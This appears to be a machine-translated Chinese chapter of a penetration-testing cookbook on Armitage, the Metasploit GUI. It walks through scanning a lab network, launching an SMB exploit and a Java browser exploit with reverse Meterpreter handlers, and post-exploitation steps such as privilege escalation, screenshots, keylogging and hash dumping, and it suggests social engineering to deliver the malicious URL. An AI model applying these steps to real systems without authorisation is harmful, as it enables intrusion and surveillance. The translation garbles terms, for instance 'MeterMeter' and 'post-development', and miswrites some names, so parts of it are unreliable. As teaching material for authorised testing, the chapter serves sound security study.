# 第九章与阿米蒂奇合作

在本章中，我们将介绍：

*   从阿米蒂奇开始
*   扫描和信息收集
*   发现漏洞和攻击目标
*   使用 tab 开关处理多个目标
*   使用阿米蒂奇进行后期开发
*   使用 Armitage 进行客户端开发

# 导言

到目前为止，我们完全关注 Metasploit 框架，并研究了如何使用该框架从渗透测试中获得最佳效果。现在我们将把重点转移到 Metasploit 扩展工具上，这些工具将渗透测试进一步提升到下一个级别。我们将从 Armitage 开始我们的旅程，Armitage 是一个在框架上运行的基于 GUI 的工具。它是 Metasploit 的智能工具，用于可视化目标、推荐漏洞利用，并公开框架中的高级漏洞利用后功能。

Armitage 围绕黑客程序组织 Metasploit 的功能。有用于发现、访问、后利用和机动的功能。Armitage 的动态工作区允许您快速定义和切换目标条件。使用此选项将数千台主机分割为目标集。Armitage 还启动扫描并从许多安全扫描仪导入数据。Armitage 可以可视化您当前的目标，这样您就可以知道您正在使用的主机以及在哪里进行会话。Armitage 建议使用漏洞攻击，并可选择运行活动检查，以告诉您哪些漏洞攻击有效。如果这些选项失败，使用冰雹玛丽攻击释放阿米蒂奇对你的目标的智能自动攻击。

一旦进入，Armitage 将公开内置在 MeterMeter 代理中的开发后工具。单击菜单，您将升级权限、记录击键、转储密码哈希、浏览文件系统和使用命令 shell。

因此，通过使用 Armitage，我们可以通过该工具提供的各种现成功能进一步简化渗透测试过程。因此，让我们从使用 Metasploit 设置 Armitage 的基础知识开始本章，稍后我们将使用 Armitage 分析端口扫描、预开发和后开发。

# 开始与阿米蒂奇接触

让我们从 Armitage 的基本设置指南开始。我们将介绍 Windows 中的 Armitage 设置和 Linux 中的回溯。Armitage 预装在最新版本的 BackTrack 中。要在 Windows 上设置 Armitage，我们可以从其官方网页下载 ZIP 文件：

[http://www.fastandeasyhacking.com/download](http://www.fastandeasyhacking.com/download)

## 怎么做。。。

让我们先在 BackTrack 中设置阿米蒂奇。

1.  Armitage will be pre-installed in BackTrack 5 R2\. It can be launched by clicking on **Applications** on the desktop and then navigating to **Backtrack** | **Exploitation tools** | **Network Exploitation tools** | **Metasploit framework** | **Armitage**.

    您将看到一个 GUI，要求您设置连接。其默认用户名和密码分别为 `msf`和 `test`。您可以将 DB 驱动程序保留为 `postgressql`，最后将 DB 连接字符串保留为 `msf3:"8b826ac0"@127.0.0.1:7175/msf3:`

    ![How to do it...](graphics/7423_09_01.jpg)

2.  Once these default settings are done, we can start the Armitage GUI by clicking on **Start MSF.**

    要在 Windows 上设置 Armitage，有两个主要要求：

    *   Metasploit 版本 4.2 及以上
    *   JDK1.6
3.  您可以从前面提到的 URL 下载 ZIP 文件，但也有一个简单的替代方法。您可以进入**启动****程序****元 sploit 框架****框架更新**。更新完成后，它将自动将 Armitage 添加到 Metasploit 库中。
4.  Once the update is done, Armitage can be started by navigating to **Start** | **Programs** | **Metasploit framework** | **Armitage**.

    ![How to do it...](graphics/7423_09_02.jpg)

5.  您将看到 connect GUI，它将为**主机、端口、用户**和**密码**设置默认值。您只需点击**连接**即可在本地启动 Armitage。
6.  单击**连接**后，它将要求您启动 Metasploit RPC 服务器。点击**是**并进入主窗口。要在远程 Metasploit 上使用 Armitage，您可以将 IP 地址从**127.0.0.1**更改为远程 IP。

## 它是如何工作的。。。

Armitage 通过创建对 Metasploit 的 RPC 调用来工作。单击**连接**后，您将注意到重复出现的 RPC 连接回失败消息。错误消息是因为 Armitage 一直试图通过抛出 RPC 调用连接到 Metasploit 框架，并等待响应。一旦连接成功，我们将看到底部包含 MSF 控制台的 Armitage GUI。

## 还有更多。。。

让我们看看如何在其他版本的 Linux 上设置 Armitage。

### 在 Linux 上设置 Armitage

在 Linux 上通过 Metasploit 设置 Armitage 也很简单。您可以从其官方网站下载安装程序，或者只需运行 `msfupdate`即可在 Metasploit 4.2 及更高版本上获得 Armitage。在 Linux 上使用 Armitage 时，请确保框架数据库已启动并正在运行。从终端运行以下命令启动 PostgreSQL: `/etc/init.d/framework-postgres start`。

# 扫描和信息收集

从我们的第一个配方开始，我们现在可以在 Armitage 启动并运行后开始使用它。在此配方中，我们将从渗透测试的最基本步骤开始，即扫描和信息收集。让我们在 Armitage 中执行 Nmap 扫描，并查看 GUI 上显示的结果。

## 准备好了吗

要启动 Nmap 扫描，您可以点击**主机**，然后点击**Nmap 扫描**，如下图所示。让我们快速进行操作系统检测扫描，查看是否有任何主机处于活动状态：

![Getting ready](graphics/7423_09_03.jpg)

快速查看 Armitage 窗口，左侧有一个搜索面板，我们可以在其中搜索框架中存在的所有不同模块，这在使用 msfconsole 时并不容易。此外，我们还可以看到 MSF**控制台**面板，从中我们可以执行迄今为止所学的任何 Metasploit 命令。因此，在使用 Armitage 时，我们既有 GUI 的功能，也有命令行的功能。

## 怎么做。。。

要执行扫描，请执行以下步骤：

1.  To start the scanning process, Armitage will ask us for an IP or IP range that it will scan. Give a scan range of 192.168.56.1/24 that will scan the entire network for us and return the operating system versions of alive hosts if it is detectable:

    ![How to do it...](graphics/7423_09_04.jpg)

2.  扫描完成后，它将以图像的形式反映所有活动主机及其可能的操作系统，如前面的屏幕截图所示。因此，在我们的例子中，有三台活动主机，其中两台运行 windows，另一台运行 Linux。
3.  Now our next step will be to gather more information about our alive targets, so that we can choose relevant exploits to perform penetration testing. Right-clicking on the image of the target will throw the **Services** option. Clicking on it will open a new tab that will list open ports and services running on these ports. In this way, we can gather lots of relevant information about multiple targets with just a few clicks:

    ![How to do it...](graphics/7423_09_05.jpg)

    这里需要注意的另一件重要事情是 Armitage 为每个新请求创建的不同选项卡。这有助于我们轻松地同时处理多个目标。我们可以很容易地在目标之间切换并获取有关它们的信息。在任何时候，如果我们在 Armitage 中缺少选项，我们都可以转到**控制台**选项卡，直接在那里试用 Metasploit 命令。这是 Armitage 相对于 Metasploit 的巨大优势。处理多个目标可以提高性能测试的效率。

在下一个配方中，我们将开始开发阶段，看看 Armitage 如何轻松快速地为我们提供相关的开发和有效负载，我们可以将其应用到我们的目标上。

## 它是如何工作的。。。

Armitage 从 Metasploit 框架导入 Nmap 功能。Nmap 所需的参数以指令的形式从 Armitage GUI 传递给 Metasploit。然后 Metasploit 调用 Nmap 脚本并将指令用作参数。

# 发现漏洞，攻击目标

从上一步开始，我们将看到如何自动查找在 Nmap 扫描中发现的目标的已知漏洞。Armitage 根据开放端口和操作系统中存在的漏洞自动发现目标的漏洞。由于搜索的漏洞利用完全取决于 Nmap 扫描返回的结果，因此此自动化过程不会始终产生正确的结果。如果操作系统发现为假，则利用漏洞将无法工作。

## 准备好了吗

让我们启动 Armitage 面板并连接到 Metasploit。然后，启动 Nmap 扫描以查找可用目标。我们已经在前两个食谱中介绍了这些步骤。让我们使用 Armitage 查找目标中的漏洞。

## 怎么做。。。

一旦发现目标，Armitage 有一个**攻击**选项，可以根据发现的目标的开放端口和操作系统漏洞查找已知的漏洞攻击。要查找漏洞，请按端口或漏洞单击**攻击****查找攻击****。**

## 它是如何工作的。。。

一旦 Armitage 发现了这些漏洞，我们将通过右击目标图像找到一个额外的选项——**攻击**。此选项反映 Armitage 针对特定目标发现的不同攻击：

![How it works...](graphics/7423_09_06.jpg)

让我们继续前进，利用我们的 Windows 目标。您可以使用 SMB `ms_08_047 netapi`漏洞攻击目标。您可以通过右键单击目标并移动到**攻击****SMB****MS_08_047 netapi**漏洞来发现此漏洞。您还可以选中**使用反向连接**选项，以便在成功执行漏洞利用后将连接返回给您。成功执行利用漏洞时，您会注意到三件事：

*   目标图像变为红色，周围有闪电，显示成功利用
*   右键单击目标为我们提供了 MeterMeter 通道的选项
*   The msfconsole shows the opening of the session

    ![How it works...](graphics/7423_09_07.jpg)

您可以看到在不传递任何命令的情况下利用目标是多么容易。GUI 提供 Metasploit 中命令驱动的所有功能。这就是为什么阿米蒂奇为框架添加了更多功能的原因。但是，对 msfconsole 命令有很好的了解是必不可少的。我们不能仅仅依靠 GUI。有几个 MSF 功能不能通过使用 Armitage 的 GUI 来利用。

在下一个配方中，我们将使用 Armitage 分析后期开发。

# 使用 tab 开关处理多个目标

在前面的几个配方中，我们已经看到了 Armitage GUI 如何简化开发过程。在这个食谱中，我们将看到使用阿米蒂奇的另一个优点。当我们在 Metasploit 中处理多个目标时，我们必须在会话之间切换以管理它们。在 Armitage 中，通过使用不同的选项卡，可以进一步简化在多个目标之间切换的过程。让我们看看是怎么做的。

## 怎么做。。。

在前面的配方中，我们已经破坏了我们的 Windows XP 目标。我们还有两个目标。我们可以通过右键单击 Windows 2008 服务器并选择一个漏洞来利用它。或者，我们也可以通过进入**查看****控制台来启动一个新的控制台。**这将启动一个新的控制台，在那里我们可以使用命令行来破坏目标。

## 它是如何工作的。。。

让我们设置一个多处理器，并使用客户端漏洞攻击目标。

```
msf > use exploit/multi/handler
msf exploit(handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf exploit(handler) > exploit
[-] Handler failed to bind to 192.168.56.101:15263
[-] Handler failed to bind to 0.0.0.0:15263
[-] Exploit exception: The address is already in use (0.0.0.0:15263).
[*] Exploit completed, but no session was created. 
```

您可以看到，利用漏洞命令抛出了一个错误，它无法在 `192.168.56.101:15263`上绑定反向处理程序。这是因为在利用 Windows XP 目标时，我们已经在此端口上设置了反向连接。因此，我们必须更改端口号，并再次使用“利用漏洞”命令。

```
msf exploit(handler) > set LPORT 1234
LPORT => 1234
msf exploit(handler) > exploit
[*] Started reverse handler on 192.168.56.101:1234
[*] Starting the payload handler... 
```

现在，一旦客户端攻击成功执行，我们将有一个反向连接，我们将有针对 2008 年服务器目标的闪电。

这里需要注意的重要一点是，对于不同的目标，我们有不同的选项卡。通过切换选项卡，我们可以轻松与任何受损目标进行交互：

![How it works...](graphics/7423_09_08.jpg)

这是 Armitage 的另一个重要功能，简化了渗透测试过程。当我们处理网络中的多个目标时，这是非常有益的。

# 使用 Armitage 进行后期开发

在前面的配方中，我们看到了 Armitage 在处理多个目标时是如何有用的。一旦目标被利用，我们的下一步将是执行各种利用后活动。让我们看看 Armitage 在开发后阶段是如何变得方便的。

## 准备好了吗

我们将分析被攻击的 Windows XP 目标，并了解如何在其上执行多个攻击后活动。

## 怎么做。。。

一旦目标被攻击，我们可以通过右键单击其图像来遵循几个 MeterMeter 选项。我们可以使用一些常用的开发后操作，如访问、交互和透视。只需单击几下，我们就可以执行多个操作。让我们执行后开发的第一个也是最基本的阶段——**权限提升**。我们可以通过右键单击目标图像并导航到**计量器****访问****升级权限**来找到此选项。另一个有趣的开发后活动是**截图**，可以通过**米表****探索****截图**浏览。目标桌面的屏幕截图将显示在新选项卡中，您可以随时刷新该选项卡。下面的屏幕截图演示了这一点：

![How to do it...](graphics/7423_09_09.jpg)

## 它是如何工作的。。。

您可以看到屏幕截图显示在一个新选项卡中，该选项卡底部有两个按钮。**刷新**按钮将显示一个新的屏幕截图，**手表**按钮将每 10 秒刷新一次屏幕截图。

类似地，您可以尝试 Armitage 中提供的大量“点击服务器”后利用选项，以加快渗透测试的过程。

这是使用 Armitage 作为 Metasploit 的潜在扩展以加快开发过程的一个小型演示。只有当我们完全控制 Metasploit 时，才能理解阿米蒂奇的真正力量。强大的命令行与 GUI 的结合使 Armitage 成为渗透测试的完美工具。

# 使用 Armitage 进行客户端开发

如果我们无法找到易受攻击的操作系统，客户端攻击可能是渗透测试的一种有用技术。正如前面在[第 4 章](04.html "Chapter 4. Client-side Exploitation and Antivirus Bypass")、*客户端攻击和防病毒旁路*中所述，客户端攻击技术利用安装在目标系统上的应用程序（如 Internet Explorer 和 Adobe Reader）中的漏洞。在此配方中，我们将在 Windows 7 上使用 Armitage 执行基于 Java 的客户端攻击。

## 准备好了吗

我们可以通过启动一个简单的 Nmap 扫描来开始我们的渗透测试，以找出 IP 地址和有关目标的其他信息。

## 怎么做。。。

要执行客户端攻击，请执行以下步骤：

1.  On the left pane of Armitage, go to **Exploit** | **Windows** | **Browser** | **java_docbase_bof**.

    您将看到几个参数选项，如以下屏幕截图所示：

    ![How to do it...](graphics/7423_09_10.jpg)

2.  利用模块要求 SRVHOST 和 URI 主机，我们必须在其中提供目标机器的 IP 地址和请求 URI。所有其他参数都已具有默认值。
3.  一旦参数值被传递，点击**启动**按钮开始开发过程。

## 它是如何工作的。。。

点击**启动**按钮后，利用活动将反映在**控制台**窗口中。Armitage 将生成一个 URI 位置，目标用户必须在其浏览器中执行该位置才能发起攻击。如果攻击成功，Armitage 会自动启动后台侦听器，等待从目标计算机返回连接。我们可以使用不同的社会工程技术将恶意 URL 传输给目标用户。

一旦攻击成功，我们将在 Armitage GUI 中注意到目标图像周围的闪电。通过右键单击目标，我们可以找到不同的攻击后选项，例如设置 MeterMeter 会话和登录。以下屏幕截图描述了此场景：

![How it works...](graphics/7423_09_11.jpg)

在**控制台**窗口中也可以监控不同进程的响应，例如设置一个 MeterMeter 会话。我们可以注意到，在控制台中执行的命令集与前面章节中介绍的相同。Armitage 仅通过提供基于 GUI 的交互介质来自动化整个过程。